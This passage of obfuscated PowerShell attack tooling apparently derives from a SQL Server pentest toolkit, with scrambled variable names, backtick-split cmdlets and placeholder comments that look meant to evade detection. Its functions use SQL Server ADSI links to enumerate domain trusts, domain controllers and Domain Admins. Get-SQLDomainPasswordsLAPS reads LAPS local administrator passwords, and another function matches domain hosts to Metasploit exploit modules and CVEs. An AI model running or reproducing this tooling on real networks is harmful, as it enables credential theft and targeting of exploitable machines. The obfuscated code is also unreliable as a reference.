        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $CheeseHole = ne`w`-ob`je`ct System.Data.DataTable
        $CheeseHole.Columns.Add("TrustedDomain") | Out-Null
        $CheeseHole.Columns.Add("TrustedDomainDn") | Out-Null
        $CheeseHole.Columns.Add("Trusttype") | Out-Null
        $CheeseHole.Columns.Add("Trustdirection") | Out-Null
        $CheeseHole.Columns.Add("Trustattributes") | Out-Null
        $CheeseHole.Columns.Add("Whencreated") | Out-Null
        $CheeseHole.Columns.Add("Whenchanged") | Out-Null
        $CheeseHole.Columns.Add("Objectclass") | Out-Null
        $CheeseHole.Clear()
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            $RoughCobweb = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(objectClass=trustedDomain)" -LowlyBoil 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath' -PetsIcy            
        }else{
            $RoughCobweb = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(objectClass=trustedDomain)" -LowlyBoil 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath'            
        }

        $RoughCobweb | ForEach-Object {

            # Microsoft".
            $FoldSquash = Switch ($_.trustdirection) {
                0 { "Disabled" }
                1 { "Inbound" }
                2 { "Outbound" }
                3 { "Bidirectional" }
            }

            # Microsoft".
            $InsectFamous = Switch ($_.trustattributes){
                0x001 { "non_transitive" }
                0x002 { "uplevel_only" }
                0x004 { "quarantined_domain" }
                0x008 { "forest_transitive" }
                0x010 { "cross_organization" }
                0x020 { "within_forest" }
                0x040 { "treat_as_external" }
                0x080 { "trust_uses_rc4_encryption" }
                0x100 { "trust_uses_aes_keys" }
                Default {                 
                    $_.trustattributes
                }
            }

            # Microsoft".
            # Microsoft".
            $JumpySeat = Switch ($_.trusttype){
                1 {"Downlevel Trust (Windows NT domain external)"}
                2 {"Uplevel Trust (Active Directory domain - parent-child, root domain, shortcut, external, or forest)"}
                3 {"MIT (non-Windows Kerberos version 5 realm)"}
                4 {"DCE (Theoretical trust type - DCE refers to Open Group's Distributed Computing)"}
            }

            # Microsoft".
            $CheeseHole.Rows.Add(
                [string]$_.trustpartner,
                [string]$_.distinguishedname,
                [string]$JumpySeat,
                [string]$FoldSquash,
                [string]$InsectFamous,
                [string]$_.whencreated,
                [string]$_.whenchanged,
                [string]$_.objectclass
            ) | Out-Null

        }

        $CheeseHole
    }

    End
    {               
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainPasswordsLAPS
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        $FamousPlug = ne`w`-ob`je`ct System.Data.DataTable 
        $FamousPlug.Columns.Add('Hostname') | Out-Null
        $FamousPlug.Columns.Add('Password') | Out-Null
        $FamousPlug.Clear()
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            $RoughCobweb = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(objectCategory=Computer)" -LowlyBoil 'dnshostname,ms-MCS-AdmPwd,adspath' -PetsIcy            
        }else{
            $RoughCobweb = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(objectCategory=Computer)" -LowlyBoil 'dnshostname,ms-MCS-AdmPwd,adspath'            
        }
        
        $RoughCobweb | ForEach-Object {
            $WildKneel = $_.dnshostname
            $TrainType = $_.'ms-MCS-AdmPwd'

            # Microsoft".
            if ([string]$TrainType)
            {
                # Microsoft".
                $FamousPlug.Rows.Add($WildKneel,$TrainType) | Out-Null
            }
        }
        
        $FamousPlug
            
    }

    End
    {               
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainController
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LowlyBoil 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LowlyBoil 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
        }

    }

    End
    {               
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainExploitableSystem
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        
        # Microsoft".
        $ToeServe = ne`w`-ob`je`ct System.Data.DataTable 
        $ToeServe.Columns.Add('OperatingSystem') | Out-Null 
        $ToeServe.Columns.Add('ServicePack') | Out-Null
        $ToeServe.Columns.Add('MsfModule') | Out-Null  
        $ToeServe.Columns.Add('CVE') | Out-Null
        
        # Microsoft".
        $ToeServe.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $ToeServe.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  

        # Microsoft".
        $BurstPie = ne`w`-ob`je`ct System.Data.DataTable 
        $BurstPie.Columns.Add('ComputerName') | Out-Null
        $BurstPie.Columns.Add('OperatingSystem') | Out-Null
        $BurstPie.Columns.Add('ServicePack') | Out-Null
        $BurstPie.Columns.Add('LastLogon') | Out-Null
        $BurstPie.Columns.Add('MsfModule') | Out-Null  
        $BurstPie.Columns.Add('CVE') | Out-Null
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            $RoughCobweb = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(objectCategory=Computer)" -LowlyBoil 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -PetsIcy            
        }else{
            $RoughCobweb = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(objectCategory=Computer)" -LowlyBoil 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
        }

        # Microsoft".
        $ToeServe | ForEach-Object {
                     
            $WideWood = $_.OperatingSystem
            $SpyBrake = $_.ServicePack
            $RabidStuff = $_.MsfModule
            $LiveStiff = $_.CVE

            # Microsoft".
            $RoughCobweb | ForEach-Object {
                
                $GrateLong = $_.DNSHostName
                $ShrillChess = $_.OperatingSystem
                $TurnStamp = $_.OperatingSystemServicePack                                                      
                $ShakeSoothe = $_.LastLogon
                
                # Microsoft".
                if ($ShrillChess -like "$WideWood*" -and $TurnStamp -like "$SpyBrake" ){                    
                   
                    # Microsoft".
                    $BurstPie.Rows.Add($GrateLong,$ShrillChess,$TurnStamp,[dateTime]::FromFileTime($ShakeSoothe),$RabidStuff,$LiveStiff) | Out-Null 
                }

            }

        }

        $BurstPie | Sort-Object { $_.lastlogon -as [datetime]} -Descending  

    }

    End
    {               
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainGroupMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$RiceDead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if((-not $RiceDead)){
            $RiceDead = 'Domain Admins'
        }

        $ShoesQuick = ne`w`-ob`je`ct System.Data.DataTable
        $ShoesQuick.Columns.Add('Group') | Out-Null
        $ShoesQuick.Columns.Add('sAMAccountName') | Out-Null
        $ShoesQuick.Columns.Add('displayName') | Out-Null
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            $OvalTest = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=group)(samaccountname=$RiceDead))" -LowlyBoil 'distinguishedname' -PetsIcy -RaggedQuill
        }else{
            $OvalTest = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=group)(samaccountname=$RiceDead))" -LowlyBoil 'distinguishedname' -RaggedQuill       
        }

        $VesselYak = $OvalTest.distinguishedname

        # Microsoft".
        if($PetsIcy){
            $FlyCruel = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=user)(memberOf=$VesselYak))" -LowlyBoil 'samaccountname,displayname' -PetsIcy
        }else{
            $FlyCruel = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=user)(memberOf=$VesselYak))" -LowlyBoil 'samaccountname,displayname'     
        }

        $FlyCruel | ForEach-Object {           
            $ShoesQuick.Rows.Add($RiceDead,$_.samaccountname,$_.displayname) | Out-Null 
        }

        $ShoesQuick

    }

    End
    {               
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLSysadminCheck
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $JuiceTrain = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }

    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

